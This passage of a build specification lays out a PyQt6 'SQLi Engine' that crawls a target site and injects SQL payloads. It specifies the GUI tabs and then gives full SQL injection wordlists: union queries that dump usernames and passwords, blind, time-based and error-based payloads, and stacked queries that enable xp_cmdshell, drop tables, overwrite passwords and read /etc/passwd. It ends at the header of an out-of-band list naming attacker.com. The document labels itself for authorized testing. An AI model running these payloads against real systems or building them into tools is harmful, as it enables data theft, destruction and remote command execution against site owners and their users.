  #
  # QVBoxLayout (main)
  #   QGroupBox "Attack Categories"
  #     QGridLayout (3 columns of checkboxes)
  #       One QCheckBox per category from CATEGORY_DISPLAY_NAMES
  #       Default checked: union, error_based, blind_boolean, auth_bypass
  #       Connect each checkbox stateChanged → self._on_selection_changed
  #   QLabel "Payload Preview:"
  #   QComboBox (preview_combo) — one item per category display name
  #     Connect currentIndexChanged → self._load_preview
  #   QPlainTextEdit (preview_box)
  #     setReadOnly(True)
  #     setMaximumHeight(120)
  #     setPlaceholderText("Select a category to preview payloads...")

get_selected_categories(self) -> list[str]:
  # Return list of category key strings where checkbox is checked.

_on_selection_changed(self) -> None:
  self.selection_changed.emit(self.get_selected_categories())

_load_preview(self, index: int) -> None:
  # Get category key from combo index
  # Read corresponding wordlist file
  # Show first 20 lines in preview_box
  # If file missing: show "File not found: ..."
```

---

## SECTION 12 — gui/widgets/live_feed.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import QTableWidget, QTableWidgetItem, QHeaderView
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QColor, QFont
from core.models import ScanResult
```

### Class: LiveFeed(QTableWidget)

```
COLUMNS (in order): "Time", "Type", "URL", "Parameter", "Category",
                    "Status", "Time(ms)", "Length", "Result"
Column widths:       80,     60,    220,   100,       120,
                     60,     80,    70,    100

__init__(self, parent=None):
  super().__init__(0, 9, parent)   # 0 rows, 9 columns
  # Set column headers
  # Set horizontal header to stretch last column:
  #   self.horizontalHeader().setStretchLastSection(True)
  # setSelectionBehavior: select whole rows
  # setEditTriggers: no editing
  # setAlternatingRowColors(True)
  # Apply column widths
  self._vuln_only = False
  self._all_results = []   # stores all ScanResult objects

add_result(self, result: ScanResult) -> None:
  # self._all_results.append(result)
  # If self._vuln_only and not result.vulnerable: return (don't show row)
  # self._insert_row(result)
  # Auto-scroll to bottom: self.scrollToBottom()

_insert_row(self, result: ScanResult) -> None:
  # row = self.rowCount()
  # self.insertRow(row)
  # Fill 9 cells:
  #   [0] result.timestamp.strftime("%H:%M:%S")
  #   [1] result.vector_type
  #   [2] result.url  (truncate to 50 chars if longer)
  #   [3] result.parameter
  #   [4] result.category
  #   [5] str(result.status_code)
  #   [6] f"{result.response_time_ms:.0f}"
  #   [7] str(result.response_length)
  #   [8] result.vuln_type if result.vulnerable else "safe"
  #
  # Row background color:
  #   if result.vulnerable:
  #     color = QColor(80, 20, 20)    ← dark red
  #   elif result.status_code == 500:
  #     color = QColor(60, 50, 10)    ← dark yellow
  #   else:
  #     color = QColor(20, 40, 20)    ← dark green (even rows)
  #
  # For vulnerable rows also make text bold.
  # Set each cell not editable: item.setFlags(Qt.ItemFlag.ItemIsSelectable |
  #                                           Qt.ItemFlag.ItemIsEnabled)

set_vuln_only(self, vuln_only: bool) -> None:
  # self._vuln_only = vuln_only
  # Rebuild table from self._all_results with filter applied:
  #   self.setRowCount(0)
  #   for r in self._all_results:
  #     if vuln_only and not r.vulnerable: continue
  #     self._insert_row(r)

clear_feed(self) -> None:
  self._all_results.clear()
  self.setRowCount(0)

get_result_at_row(self, row: int) -> ScanResult | None:
  # Return the ScanResult for the given visual row index.
  # Must account for vuln_only filter.
  # If row out of range: return None.
```

---

## SECTION 13 — gui/scanner_tab.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QLineEdit, QPushButton, QLabel, QSlider, QSpinBox,
    QDoubleSpinBox, QGroupBox, QProgressBar, QTextEdit,
    QSplitter, QFrame
)
from PyQt6.QtCore import Qt, pyqtSignal
from core.models import SiteMap, RateConfig
from core.crawler import CrawlerWorker
from core.history_manager import HistoryManager
from gui.widgets.vector_tree import VectorTree
from gui.widgets.payload_selector import PayloadSelector
```

### Class: ScannerTab(QWidget)

```
SIGNALS:
  scan_requested = pyqtSignal(object, dict, object, int)
  # emits (SiteMap, payloads_dict, RateConfig, session_id)

__init__(self, history: HistoryManager, parent=None):
  super().__init__(parent)
  self.history        = history
  self._site_map      = None
  self._crawler       = None
  self._session_id    = None
  self._setup_ui()

_setup_ui(self) -> None:
  # LAYOUT DESCRIPTION (build exactly this):
  #
  # QVBoxLayout (main_layout)
  # │
  # ├── QGroupBox "Target"
  # │     QHBoxLayout
  # │       QLabel "URL:"
  # │       self.url_input = QLineEdit()
  # │         placeholder: "https://target.com"
  # │       self.crawl_btn = QPushButton("🌐 Crawl Site")
  # │         connect clicked → self._start_crawl
  # │
  # ├── QSplitter (Horizontal)
  # │   ├── LEFT: QGroupBox "Discovered Input Vectors"
  # │   │     self.vector_tree = VectorTree()
  # │   │
  # │   └── RIGHT: QGroupBox "Attack Configuration"
  # │         self.payload_selector = PayloadSelector()
  # │
  # ├── QGroupBox "Rate Control"
  # │     QGridLayout
  # │       Row 0: QLabel "Threads:"    | self.threads_spin = QSpinBox(1,50,default=10)
  # │       Row 1: QLabel "Req/Sec:"    | self.rps_spin = QDoubleSpinBox(0.1,50,default=5.0)
  # │       Row 2: QLabel "Max Reqs:"   | self.maxreqs_spin = QSpinBox(0,999999,default=0)
  # │                                     QLabel "(0 = unlimited)"
  # │       Row 3: QLabel "Timeout(s):" | self.timeout_spin = QSpinBox(1,60,default=10)
  # │
  # ├── self.crawl_status = QLabel("Enter a URL and click Crawl Site to begin.")
  # │
  # ├── self.progress_bar = QProgressBar()
  # │     setRange(0, 100); setValue(0); setVisible(False)
  # │
  # ├── self.progress_label = QLabel("")
  # │
  # └── QHBoxLayout (buttons)
  #       self.start_btn  = QPushButton("▶  Start Scan")
  #       self.pause_btn  = QPushButton("⏸  Pause")
  #       self.stop_btn   = QPushButton("⏹  Stop")
  #       self.vuln_label = QLabel("Vulnerabilities found: 0")
  #       start_btn connect → self._emit_scan_request
  #       pause_btn/stop_btn connect → signals that main_window handles
  #       start_btn disabled until crawl_complete
  #       pause_btn disabled initially
  #       stop_btn  disabled initially

_start_crawl(self) -> None:
  # Validate url_input is not empty and starts with http:// or https://
  # If invalid: show error in crawl_status label and return
  #
  # self._crawler = CrawlerWorker(
  #   target_url = self.url_input.text().strip(),
  #   max_depth  = 3,
  #   headers    = {"User-Agent": "Mozilla/5.0"},
  # )
  # Connect signals:
  #   self._crawler.page_found     → self._on_page_found
  #   self._crawler.vector_found   → self._on_vector_found
  #   self._crawler.crawl_complete → self._on_crawl_complete
  #   self._crawler.crawl_error    → self._on_crawl_error
  #   self._crawler.progress       → self._on_crawl_progress
  # Disable crawl_btn, set crawl_status to "Crawling..."
  # self._crawler.start()

_on_page_found(self, url: str) -> None:
  self.crawl_status.setText(f"Crawling: {url}")

_on_vector_found(self, vtype: str, desc: str) -> None:
  # Append to crawl_status label (keep last 3 lines only to avoid overflow)
  pass

_on_crawl_progress(self, visited: int, queued: int) -> None:
  self.crawl_status.setText(f"Crawled {visited} pages | {queued} in queue...")

_on_crawl_complete(self, site_map: SiteMap) -> None:
  # self._site_map = site_map
  # self.vector_tree.populate(site_map)
  # Enable start_btn
  # Re-enable crawl_btn
  # Show summary in crawl_status:
  #   f"Crawl complete: {len(site_map.pages)} pages, "
  #   f"{len(site_map.forms)} forms, "
  #   f"{len(site_map.param_vectors)} params, "
  #   f"{len(site_map.cookies)} cookies discovered."

_on_crawl_error(self, message: str) -> None:
  self.crawl_status.setText(f"Crawl error: {message}")
  self.crawl_btn.setEnabled(True)

_emit_scan_request(self) -> None:
  # Validate site_map is not None
  # selected_categories = self.payload_selector.get_selected_categories()
  # If none selected: show message in crawl_status and return
  # payloads = load_payloads(selected_categories)  ← import from core.injector
  # If all payload lists empty: show message and return
  # rate_config = RateConfig(
  #   requests_per_second = self.rps_spin.value(),
  #   max_threads         = self.threads_spin.value(),
  #   request_timeout_sec = self.timeout_spin.value(),
  #   max_total_requests  = self.maxreqs_spin.value(),
  # )
  # self._session_id = self.history.create_session(self.url_input.text().strip())
  # self.scan_requested.emit(self._site_map, payloads, rate_config, self._session_id)

update_progress(self, done: int, total: int) -> None:
  self.progress_bar.setVisible(True)
  if total > 0:
    pct = int((done / total) * 100)
    self.progress_bar.setValue(pct)
  self.progress_label.setText(f"{done} / {total} requests")

update_vuln_count(self, count: int) -> None:
  self.vuln_label.setText(f"Vulnerabilities found: {count} 🔴" if count > 0
                           else "Vulnerabilities found: 0")

set_scanning(self, scanning: bool) -> None:
  self.start_btn.setEnabled(not scanning)
  self.pause_btn.setEnabled(scanning)
  self.stop_btn.setEnabled(scanning)
  self.crawl_btn.setEnabled(not scanning)
```

---

## SECTION 14 — gui/results_tab.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter,
    QPushButton, QCheckBox, QLabel, QTextEdit,
    QGroupBox, QFrame
)
from PyQt6.QtCore import Qt
from core.models import ScanResult
from gui.widgets.live_feed import LiveFeed
```

### Class: ResultsTab(QWidget)

```
__init__(self, parent=None):
  super().__init__(parent)
  self._setup_ui()

_setup_ui(self) -> None:
  # LAYOUT:
  #
  # QVBoxLayout (main)
  # │
  # ├── QHBoxLayout (toolbar)
  # │     QLabel "Live Request Feed"  (bold)
  # │     self.vuln_only_cb = QCheckBox("Show vulnerable only")
  # │       connect stateChanged → self._on_filter_changed
  # │     self.clear_btn = QPushButton("Clear")
  # │       connect clicked → self.live_feed.clear_feed
  # │     self.export_btn = QPushButton("Export Selected")
  # │
  # ├── QSplitter (Vertical)
  # │   ├── TOP: self.live_feed = LiveFeed()
  # │   │     connect itemSelectionChanged → self._on_row_selected
  # │   │
  # │   └── BOTTOM: QSplitter (Horizontal)
  # │         ├── LEFT: QGroupBox "Request"
  # │         │     self.request_box = QTextEdit()
  # │         │       setReadOnly(True)
  # │         │       setFont(monospace font, size 9)
  # │         │
  # │         └── RIGHT: QGroupBox "Response"
  # │               self.response_box = QTextEdit()
  # │                 setReadOnly(True)
  # │                 setFont(monospace font, size 9)
  # │
  # └── self.detail_label = QLabel("")   ← shows status/time/length/vuln_type

add_result(self, result: ScanResult) -> None:
  self.live_feed.add_result(result)

_on_row_selected(self) -> None:
  # Get selected row index
  # result = self.live_feed.get_result_at_row(selected_row)
  # If result is None: return
  # self._show_detail(result)

_show_detail(self, result: ScanResult) -> None:
  # REQUEST PANEL — reconstruct request text:
  #   if result.vector_type == "form":
  #     text = f"POST {result.url} HTTP/1.1\n"
  #     text += f"Content-Type: application/x-www-form-urlencoded\n\n"
  #     text += f"{result.parameter}={result.payload}"
  #   else:
  #     text = f"GET {result.url} HTTP/1.1\n"
  #     text += f"(parameter: {result.parameter} = {result.payload})"
  #   self.request_box.setPlainText(text)
  #
  # RESPONSE PANEL:
  #   self.response_box.setPlainText(
  #     f"HTTP/1.1 {result.status_code}\n\n{result.response_body}"
  #   )
  #
  # DETAIL LABEL:
  #   vuln_text = f"⚠ {result.vuln_type} ({result.confidence})" \
  #               if result.vulnerable else "✓ Not Vulnerable"
  #   self.detail_label.setText(
  #     f"Status: {result.status_code}  |  "
  #     f"Time: {result.response_time_ms:.0f}ms  |  "
  #     f"Length: {result.response_length}  |  {vuln_text}"
  #   )

_on_filter_changed(self, state: int) -> None:
  self.live_feed.set_vuln_only(state == Qt.CheckState.Checked.value)

clear_feed(self) -> None:
  self.live_feed.clear_feed()
  self.request_box.clear()
  self.response_box.clear()
  self.detail_label.setText("")
```

---

## SECTION 15 — gui/history_tab.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QTableWidget, QTableWidgetItem,
    QPushButton, QLabel, QHeaderView, QFileDialog, QMessageBox,
    QGroupBox
)
from PyQt6.QtCore import Qt
from core.models import SessionRow
from core.history_manager import HistoryManager
```

### Class: HistoryTab(QWidget)

```
__init__(self, history: HistoryManager, parent=None):
  super().__init__(parent)
  self.history = history
  self._setup_ui()
  self.refresh()

_setup_ui(self) -> None:
  # LAYOUT:
  #
  # QVBoxLayout
  # ├── QLabel "Past Scan Sessions" (bold, large)
  # ├── self.sessions_table = QTableWidget(0, 6)
  # │     Headers: ["ID", "Target URL", "Started", "Ended", "Requests", "Vulns"]
  # │     setSelectionBehavior: select rows
  # │     setEditTriggers: no editing
  # │     horizontalHeader stretch last section
  # │     connect itemSelectionChanged → self._on_session_selected
  # │
  # ├── QHBoxLayout (buttons)
  # │     self.refresh_btn    = QPushButton("🔄 Refresh")
  # │     self.export_csv_btn = QPushButton("Export CSV")
  # │     self.export_json_btn= QPushButton("Export JSON")
  # │     self.delete_btn     = QPushButton("🗑 Delete")
  # │     refresh_btn → self.refresh
  # │     export_csv_btn → self._export_csv
  # │     export_json_btn → self._export_json
  # │     delete_btn → self._delete_session
  # │
  # └── QGroupBox "Vulnerability Summary"
  #       self.summary_table = QTableWidget(0, 4)
  #         Headers: ["Vuln Type", "Count", "Confidence", "Parameters"]

refresh(self) -> None:
  sessions = self.history.get_all_sessions()
  self.sessions_table.setRowCount(0)
  for s in sessions:
    row = self.sessions_table.rowCount()
    self.sessions_table.insertRow(row)
    self.sessions_table.setItem(row, 0, QTableWidgetItem(str(s.id)))
    self.sessions_table.setItem(row, 1, QTableWidgetItem(s.target_url))
    self.sessions_table.setItem(row, 2, QTableWidgetItem(s.started_at))
    self.sessions_table.setItem(row, 3, QTableWidgetItem(s.ended_at))
    self.sessions_table.setItem(row, 4, QTableWidgetItem(str(s.total_reqs)))
    vuln_item = QTableWidgetItem(str(s.vulns_found))
    if s.vulns_found > 0:
      # color vuln count cell red
      pass
    self.sessions_table.setItem(row, 5, vuln_item)

_get_selected_session_id(self) -> int | None:
  rows = self.sessions_table.selectedItems()
  if not rows: return None
  return int(self.sessions_table.item(rows[0].row(), 0).text())

_on_session_selected(self) -> None:
  sid = self._get_selected_session_id()
  if sid is None: return
  results = self.history.get_results_for_session(sid)
  # Build summary: group results by vuln_type, count occurrences, collect param names
  # Populate self.summary_table with aggregated data

_export_csv(self) -> None:
  sid = self._get_selected_session_id()
  if sid is None:
    QMessageBox.warning(self, "No Selection", "Select a session first.")
    return
  path, _ = QFileDialog.getSaveFileName(self, "Save CSV", f"scan_{sid}.csv",
                                         "CSV Files (*.csv)")
  if path:
    self.history.export_to_csv(sid, path)
    QMessageBox.information(self, "Exported", f"Saved to {path}")

_export_json(self) -> None:
  sid = self._get_selected_session_id()
  if sid is None:
    QMessageBox.warning(self, "No Selection", "Select a session first.")
    return
  path, _ = QFileDialog.getSaveFileName(self, "Save JSON", f"scan_{sid}.json",
                                         "JSON Files (*.json)")
  if path:
    self.history.export_to_json(sid, path)
    QMessageBox.information(self, "Exported", f"Saved to {path}")

_delete_session(self) -> None:
  sid = self._get_selected_session_id()
  if sid is None:
    QMessageBox.warning(self, "No Selection", "Select a session first.")
    return
  reply = QMessageBox.question(self, "Confirm Delete",
    f"Delete session {sid} and all its results?",
    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
  if reply == QMessageBox.StandardButton.Yes:
    self.history.delete_session(sid)
    self.refresh()
```

---

## SECTION 16 — gui/settings_tab.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QFormLayout, QLineEdit,
    QSpinBox, QCheckBox, QPushButton, QGroupBox,
    QFileDialog, QLabel, QMessageBox
)
from PyQt6.QtCore import pyqtSignal
```

### Class: SettingsTab(QWidget)

```
SIGNALS:
  settings_saved = pyqtSignal(dict)   # emits settings dict when saved

__init__(self, parent=None):
  super().__init__(parent)
  self._setup_ui()

_setup_ui(self) -> None:
  # LAYOUT:
  #
  # QVBoxLayout
  # ├── QGroupBox "Request Headers"
  # │     QFormLayout
  # │       "User-Agent:" → self.ua_input = QLineEdit("Mozilla/5.0 (X11; Linux x86_64)")
  # │       "Accept:"     → self.accept_input = QLineEdit("text/html,application/json,*/*")
  # │       "Referer:"    → self.referer_input = QLineEdit()
  # │       "Custom Cookies:" → self.cookies_input = QLineEdit()
  # │                            placeholder: "name1=val1; name2=val2"
  # │
  # ├── QGroupBox "Proxy"
  # │     QFormLayout
  # │       "Proxy URL:" → self.proxy_input = QLineEdit()
  # │                       placeholder: "http://127.0.0.1:8080"
  # │       "Enable:"    → self.proxy_cb = QCheckBox()
  # │
  # ├── QGroupBox "Crawl Options"
  # │     QFormLayout
  # │       "Max Depth:"  → self.depth_spin = QSpinBox(1, 10, default=3)
  # │       "Max Pages:"  → self.pages_spin = QSpinBox(10, 5000, default=200)
  # │       "Ignore robots.txt:" → self.robots_cb = QCheckBox() (unchecked default)
  # │
  # ├── QGroupBox "Wordlists"
  # │     QHBoxLayout
  # │       self.wordlist_path = QLineEdit("wordlists")
  # │       QPushButton("Browse...") → self._browse_wordlists
  # │
  # └── QPushButton("💾 Save Settings") → self._save

get_headers(self) -> dict:
  # Return headers dict from input fields
  headers = {"User-Agent": self.ua_input.text()}
  if self.accept_input.text():
    headers["Accept"] = self.accept_input.text()
  if self.referer_input.text():
    headers["Referer"] = self.referer_input.text()
  if self.cookies_input.text():
    headers["Cookie"] = self.cookies_input.text()
  return headers

get_proxies(self) -> dict | None:
  if self.proxy_cb.isChecked() and self.proxy_input.text():
    url = self.proxy_input.text()
    return {"http": url, "https": url}
  return None

get_wordlists_dir(self) -> str:
  return self.wordlist_path.text() or "wordlists"

_browse_wordlists(self) -> None:
  path = QFileDialog.getExistingDirectory(self, "Select Wordlists Directory")
  if path:
    self.wordlist_path.setText(path)

_save(self) -> None:
  settings = {
    "headers":       self.get_headers(),
    "proxies":       self.get_proxies(),
    "wordlists_dir": self.get_wordlists_dir(),
    "max_depth":     self.depth_spin.value(),
    "max_pages":     self.pages_spin.value(),
  }
  self.settings_saved.emit(settings)
  QMessageBox.information(self, "Settings", "Settings saved.")
```

---

## SECTION 17 — gui/main_window.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (
    QMainWindow, QTabWidget, QStatusBar,
    QLabel, QWidget
)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont
from core.history_manager import HistoryManager
from core.injector import InjectorWorker
from core.models import SiteMap, RateConfig
from gui.scanner_tab import ScannerTab
from gui.results_tab import ResultsTab
from gui.history_tab import HistoryTab
from gui.settings_tab import SettingsTab
```

### Class: MainWindow(QMainWindow)

```
__init__(self):
  super().__init__()
  self.setWindowTitle("SQLi Engine v1.0 — Authorized Testing Only")
  self.setMinimumSize(1200, 750)
  self._injector   = None   # holds current InjectorWorker
  self._vuln_count = 0
  self._setup()

_setup(self) -> None:
  # 1. Create HistoryManager
  self._history = HistoryManager("db/history.sqlite")
  #
  # 2. Create tabs
  self._scanner = ScannerTab(self._history)
  self._results = ResultsTab()
  self._history_tab = HistoryTab(self._history)
  self._settings = SettingsTab()
  #
  # 3. Create QTabWidget
  tabs = QTabWidget()
  tabs.addTab(self._scanner,     "🔍 Scanner")
  tabs.addTab(self._results,     "📡 Live Results")
  tabs.addTab(self._history_tab, "📁 History")
  tabs.addTab(self._settings,    "⚙ Settings")
  self.setCentralWidget(tabs)
  #
  # 4. Status bar
  self._status = QStatusBar()
  self.setStatusBar(self._status)
  self._status_label = QLabel("Ready.")
  self._status.addWidget(self._status_label)
  #
  # 5. Wire signals
  self._scanner.scan_requested.connect(self._start_scan)
  self._scanner.pause_btn.clicked.connect(self._pause_scan)
  self._scanner.stop_btn.clicked.connect(self._stop_scan)
  #
  # 6. Apply dark stylesheet (call self._apply_stylesheet())

_apply_stylesheet(self) -> None:
  # Apply this exact QSS string using self.setStyleSheet("..."):
  #
  # QMainWindow, QWidget {
  #   background-color: #0d1117;
  #   color: #e6edf3;
  #   font-family: 'Segoe UI', sans-serif;
  #   font-size: 13px;
  # }
  # QTabWidget::pane { border: 1px solid #30363d; }
  # QTabBar::tab {
  #   background: #161b22; color: #8b949e;
  #   padding: 8px 16px; border: 1px solid #30363d;
  # }
  # QTabBar::tab:selected { background: #21262d; color: #e6edf3; }
  # QGroupBox {
  #   border: 1px solid #30363d; border-radius: 4px;
  #   margin-top: 8px; padding-top: 8px;
  # }
  # QGroupBox::title { color: #8b949e; }
  # QPushButton {
  #   background: #21262d; color: #e6edf3;
  #   border: 1px solid #30363d; border-radius: 4px;
  #   padding: 6px 14px;
  # }
  # QPushButton:hover   { background: #30363d; }
  # QPushButton:pressed { background: #388bfd; }
  # QPushButton:disabled { color: #484f58; }
  # QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox, QTextEdit, QPlainTextEdit {
  #   background: #161b22; color: #e6edf3;
  #   border: 1px solid #30363d; border-radius: 4px;
  #   padding: 4px;
  # }
  # QTableWidget {
  #   background: #0d1117; color: #e6edf3;
  #   gridline-color: #21262d;
  #   selection-background-color: #1f6feb;
  # }
  # QHeaderView::section {
  #   background: #161b22; color: #8b949e;
  #   border: 1px solid #30363d; padding: 4px;
  # }
  # QTreeWidget {
  #   background: #0d1117; color: #e6edf3;
  #   border: 1px solid #30363d;
  # }
  # QProgressBar {
  #   background: #21262d; border: 1px solid #30363d;
  #   border-radius: 4px; text-align: center;
  # }
  # QProgressBar::chunk { background: #1f6feb; border-radius: 3px; }
  # QScrollBar:vertical {
  #   background: #161b22; width: 10px;
  # }
  # QScrollBar::handle:vertical { background: #30363d; border-radius: 4px; }

_start_scan(self, site_map: SiteMap, payloads: dict,
             rate_config: RateConfig, session_id: int) -> None:
  # Get headers from settings tab:
  headers = self._settings.get_headers()
  #
  # Create and configure injector:
  self._injector = InjectorWorker(
    site_map    = site_map,
    payloads    = payloads,
    rate_config = rate_config,
    headers     = headers,
    session_id  = session_id,
    history     = self._history,
  )
  #
  # Connect injector signals:
  self._injector.scan_started.connect(
    lambda total: self._status_label.setText(f"Scanning... {total} requests queued"))
  self._injector.result_ready.connect(self._on_result)
  self._injector.progress_updated.connect(self._scanner.update_progress)
  self._injector.scan_complete.connect(self._on_scan_complete)
  self._injector.scan_error.connect(
    lambda msg: self._status_label.setText(f"Error: {msg}"))
  #
  # Start injector thread
  self._vuln_count = 0
  self._results.clear_feed()
  self._scanner.set_scanning(True)
  self._injector.start()

_on_result(self, result) -> None:
  self._results.add_result(result)
  if result.vulnerable:
    self._vuln_count += 1
    self._scanner.update_vuln_count(self._vuln_count)

_on_scan_complete(self, total: int, vulns: int) -> None:
  self._scanner.set_scanning(False)
  self._history_tab.refresh()
  self._status_label.setText(
    f"Scan complete. {total} requests sent. {vulns} vulnerabilities found.")

_pause_scan(self) -> None:
  if self._injector:
    if self._injector._limiter.is_paused():
      self._injector.resume()
      self._scanner.pause_btn.setText("⏸  Pause")
      self._status_label.setText("Scan resumed.")
    else:
      self._injector.pause()
      self._scanner.pause_btn.setText("▶  Resume")
      self._status_label.setText("Scan paused.")

_stop_scan(self) -> None:
  if self._injector:
    self._injector.stop()
    self._scanner.set_scanning(False)
    self._status_label.setText("Scan stopped by user.")
```

---

## SECTION 18 — main.py

COMPLETE FILE CONTENT — write exactly this:

```python
#!/usr/bin/env python3
"""
SQLi Engine — Entry Point
Authorized penetration testing use only.
"""
import sys
import os
from pathlib import Path

# Ensure project root is in sys.path
ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

# Create required directories before any imports
Path("db").mkdir(exist_ok=True)
Path("exports").mkdir(exist_ok=True)
Path("wordlists").mkdir(exist_ok=True)

from PyQt6.QtWidgets import QApplication
from PyQt6.QtCore import Qt
from gui.main_window import MainWindow


def main():
    app = QApplication(sys.argv)
    app.setApplicationName("SQLi Engine")
    app.setOrganizationName("PenTest Tools")

    # Set platform environment for Kali Linux
    os.environ.setdefault("QT_QPA_PLATFORM", "xcb")

    window = MainWindow()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
```

---

## SECTION 19 — WORDLIST FILES

### wordlists/union_payloads.txt

Write this file with exactly these payloads (one per line):

```
# Union-Based SQL Injection Payloads
# Targets: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
' UNION ALL SELECT NULL,NULL,NULL--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION ALL SELECT NULL,NULL,NULL--
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT @@version,NULL--
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT user(),NULL--
' UNION SELECT database(),NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns--
' UNION SELECT username,password FROM users--
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,@@datadir--
' UNION SELECT NULL,version()--
' UNION SELECT NULL,current_user()--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,banner FROM v$version--
```

### wordlists/blind_boolean_payloads.txt

```
# Boolean-Based Blind SQL Injection Payloads
# True condition → page loads normally. False → page changes.
' AND 1=1--
' AND 1=2--
' AND 'a'='a'--
' AND 'a'='b'--
1 AND 1=1
1 AND 1=2
' OR 1=1--
' OR 1=2--
') AND 1=1--
') AND 1=2--
' AND 1=1 AND '1'='1
' AND 1=1 AND '1'='2
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING(username,1,1)='b'--
' AND LENGTH(username)>0--
' AND LENGTH(username)>10--
' AND ASCII(SUBSTRING(username,1,1))>64--
' AND ASCII(SUBSTRING(username,1,1))>96--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM users)>100--
1' AND '1'='1
1' AND '1'='2
admin' AND '1'='1
admin' AND '1'='2
' AND 2>1--
' AND 2<1--
' AND 1 BETWEEN 0 AND 2--
' AND 1 NOT BETWEEN 0 AND 2--
1 AND (SELECT 1 FROM users LIMIT 1)=1--
1 AND (SELECT 1 FROM users LIMIT 1)=2--
```

### wordlists/blind_time_payloads.txt

```
# Time-Based Blind SQL Injection Payloads
# If vulnerable, response will be delayed by the specified seconds
'; SELECT SLEEP(5)--
'; SELECT SLEEP(3)--
' AND SLEEP(5)--
' AND SLEEP(3)--
' OR SLEEP(5)--
1; SELECT SLEEP(5)--
1 AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:3'--
1; WAITFOR DELAY '0:0:5'--
1 WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
'; SELECT pg_sleep(3)--
' AND 1=1; SELECT SLEEP(5)--
' OR 1=1 WAITFOR DELAY '0:0:5'--
1); SELECT SLEEP(5)--
1); WAITFOR DELAY '0:0:5'--
') OR SLEEP(5)--
') AND SLEEP(5)--
'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--
'; SELECT 1 FROM (SELECT SLEEP(5)) t--
' AND (SELECT 1 FROM (SELECT SLEEP(5)) t)--
1 OR SLEEP(5)--
1 OR pg_sleep(5)--
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
```

### wordlists/error_based_payloads.txt

```
# Error-Based SQL Injection Payloads
# Forces database errors that reveal version/schema info
'
''
'''
'--
' --
"
""
`
')
'))
';
' OR ''='
' OR 1=1--
AND 1=2
AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),0)--
1 AND EXP(~(SELECT * FROM(SELECT user())a))--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' UNION SELECT 1,2,3 FROM not_a_table--
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
'; EXEC('SELECT 1/0')--
' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--
```

### wordlists/stacked_queries_payloads.txt

```
# Stacked Queries SQL Injection Payloads
# Requires database driver that supports multiple statements
'; SELECT 1--
'; SELECT @@version--
'; SELECT user()--
'; SELECT database()--
'; EXEC sp_configure 'show advanced options',1--
'; EXEC sp_configure 'xp_cmdshell',1--
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('id')--
'; INSERT INTO users VALUES('attacker','password')--
'; UPDATE users SET password='hacked' WHERE 1=1--
'; DROP TABLE logs--
'; CREATE TABLE rce(output TEXT)--
'; SELECT * INTO OUTFILE '/tmp/out.txt' FROM users--
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users--
1; SELECT SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
'; DECLARE @x NVARCHAR(100)='whoami'; EXEC xp_cmdshell @x--
'; SELECT pg_sleep(5)--
'; COPY (SELECT '') TO PROGRAM 'id'--
'; CALL DBMS_OUTPUT.PUT_LINE(USER)--
```

### wordlists/out_of_band_payloads.txt

```
# Out-of-Band SQL Injection Payloads
# Exfiltrates data via DNS or HTTP to attacker-controlled server
# Replace attacker.com with your controlled domain during testing
